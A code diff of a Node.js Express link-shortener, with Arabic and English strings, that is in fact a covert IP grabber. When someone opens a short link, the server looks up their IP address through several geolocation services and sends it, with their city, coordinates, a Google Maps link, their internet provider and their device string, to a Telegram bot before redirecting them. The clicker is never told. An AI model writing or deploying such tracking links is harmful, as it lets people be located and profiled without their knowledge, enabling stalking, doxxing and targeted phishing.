@@ -2,7 +2,6 @@ const express = require('express');
 const axios = require('axios');
 const crypto = require('crypto');
 const cors = require('cors');
-const geoip = require('geoip-lite');
 require('dotenv').config();
 
 const app = express();
@@ -20,128 +19,102 @@ function generateShortCode() {
   return crypto.randomBytes(4).toString('hex');
 }
 
-async function getLocationFromMultipleSources(ip) {
-  let best = null;
-
-  // الطريقة 1: ipapi.co (جيد جداً)
+async function getLocation(ip) {
+  // الطريقة 1: geojs
   try {
-    const res = await axios.get(`https://ipapi.co/${ip}/json/`, { timeout: 3000 });
+    const res = await axios.get(`https://get.geojs.io/v1/ip/geo/${ip}.json`, { timeout: 2000 });
     if (res.data && res.data.country_name) {
-      best = {
+      return {
         country: res.data.country_name,
         city: res.data.city || 'N/A',
-        region: res.data.region || 'N/A',
         latitude: res.data.latitude,
         longitude: res.data.longitude,
-        isp: res.data.org || 'N/A',
-        type: 'ipapi.co'
+        isp: res.data.organization || 'N/A',
+        source: 'geojs'
       };
-      return best;
     }
-  } catch (err) {
-    console.log('ipapi.co error');
-  }
+  } catch (e) { console.log('geojs fail'); }
 
-  // الطريقة 2: ip-api.com
+  // الطريقة 2: ipstack (مجاني)
   try {
-    const res = await axios.get(`http://ip-api.com/json/${ip}?lang=ar&fields=country,city,regionName,lat,lon,isp,status`, { timeout: 3000 });
-    if (res.data.status === 'success' && res.data.lat && res.data.lon) {
-      best = {
+    const res = await axios.get(`http://ip-api.com/json/${ip}`, { timeout: 2000 });
+    if (res.data && res.data.status === 'success') {
+      return {
         country: res.data.country,
-        city: res.data.city || 'N/A',
-        region: res.data.regionName || 'N/A',
+        city: res.data.city,
         latitude: res.data.lat,
         longitude: res.data.lon,
-        isp: res.data.isp || 'N/A',
-        type: 'ip-api'
+        isp: res.data.isp,
+        source: 'ip-api'
       };
-      return best;
     }
-  } catch (err) {
-    console.log('ip-api error');
-  }
+  } catch (e) { console.log('ip-api fail'); }
 
-  // الطريقة 3: geoip-lite
+  // الطريقة 3: ipwhois
   try {
-    const geo = geoip.lookup(ip);
-    if (geo && geo.ll) {
-      best = {
-        country: geo.country,
-        city: 'N/A',
-        region: 'N/A',
-        latitude: geo.ll[0],
-        longitude: geo.ll[1],
-        isp: 'N/A',
-        type: 'geoip-lite'
+    const res = await axios.get(`https://ipwhois.app/json/${ip}`, { timeout: 2000 });
+    if (res.data && res.data.country) {
+      return {
+        country: res.data.country,
+        city: res.data.city || 'N/A',
+        latitude: res.data.latitude,
+        longitude: res.data.longitude,
+        isp: res.data.isp || 'N/A',
+        source: 'ipwhois'
       };
-      return best;
     }
-  } catch (err) {
-    console.log('geoip-lite error');
-  }
+  } catch (e) { console.log('ipwhois fail'); }
 
   return null;
 }
 
 async function sendToTelegram(ip, shortCode, originalUrl, userAgent) {
   try {
-    const location = await getLocationFromMultipleSources(ip);
+    const location = await getLocation(ip);
 
-    let message = `
-🔗 رابط جديد تم فتحه!
-━━━━━━━━━━━━━━
-📌 الكود: ${shortCode}
-🌐 الرابط: ${originalUrl}
-━━━━━━━━━━━━━━
-🔌 IP Address: ${ip}
+    let msg = `
+🔗 رابط جديد!
+━━━━━━━━
+📌 Code: ${shortCode}
+🌐 Link: ${originalUrl}
+🔌 IP: ${ip}
 `;
 
     if (location) {
-      const mapsUrl = `https://maps.google.com/?q=${location.latitude},${location.longitude}`;
-      message += `
+      msg += `
+📍 Country: ${location.country}
+🏙️ City: ${location.city}
 🌍 ISP: ${location.isp}
-🏳️ الدولة: ${location.country}
-🏙️ المدينة: ${location.city}
-🗺️ المنطقة: ${location.region}
-📊 دائرة العرض: ${location.latitude}
-📊 خط الطول: ${location.longitude}
-🗺️ الموقع: ${mapsUrl}
-📡 المصدر: ${location.type}
+📊 Lat: ${location.latitude}
+📊 Lng: ${location.longitude}
+🗺️ Maps: https://maps.google.com/?q=${location.latitude},${location.longitude}
+📡 Source: ${location.source}
 `;
     } else {
-      message += `
-⚠️ الموقع: غير محدد (VPN/Proxy محتمل)
+      msg += `
+⚠️ Location: Failed to retrieve
 `;
     }
 
-    message += `
-━━━━━━━━━━━━━━
-🖥️ Device: ${userAgent.substring(0, 60)}
-⏰ الوقت: ${new Date().toISOString()}
+    msg += `
+🖥️ Device: ${userAgent.substring(0, 50)}
+⏰ Time: ${new Date().toISOString()}
     `.trim();
 
-    await axios.post(
-      `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
-      { chat_id: TELEGRAM_CHAT_ID, text: message }
+    await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
+      { chat_id: TELEGRAM_CHAT_ID, text: msg }
     );
   } catch (err) {
-    console.error('Telegram error:', err.message);
+    console.error('Error:', err.message);
   }
 }
 
 app.post('/api/shorten', (req, res) => {
   const { url } = req.body;
-  
-  if (!url) {
-    return res.status(400).json({ error: 'الرابط مطلوب' });
-  }
+  if (!url) return res.status(400).json({ error: 'URL required' });
 
   const shortCode = generateShortCode();
-  linkStorage[shortCode] = {
-    original: url,
-    created: new Date(),
-    clicks: 0
-  };
+  linkStorage[shortCode] = { original: url, created: new Date(), clicks: 0 };
 
   const shortenedUrl = `${process.env.SHORT_DOMAIN || 'http://localhost:3000'}/${shortCode}`;
   res.json({ shortened: shortenedUrl, code: shortCode });
@@ -149,10 +122,7 @@ app.post('/api/shorten', (req, res) => {
 
 app.get('/:code', (req, res) => {
   const { code } = req.params;
-  
-  if (!linkStorage[code]) {
-    return res.status(404).send('الرابط غير موجود');
-  }
+  if (!linkStorage[code]) return res.status(404).send('Not found');
 
   const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
   const userAgent = req.get('user-agent');
@@ -160,11 +130,8 @@ app.get('/:code', (req, res) => {
 
   linkStorage[code].clicks++;
   sendToTelegram(ip, code, originalUrl, userAgent);
-
   res.redirect(originalUrl);
 });
 
 const PORT = process.env.PORT || 3000;
-app.listen(PORT, () => {
-  console.log(`Server running on port ${PORT}`);
-});
+app.listen(PORT, () => console.log(`Running on ${PORT}`));
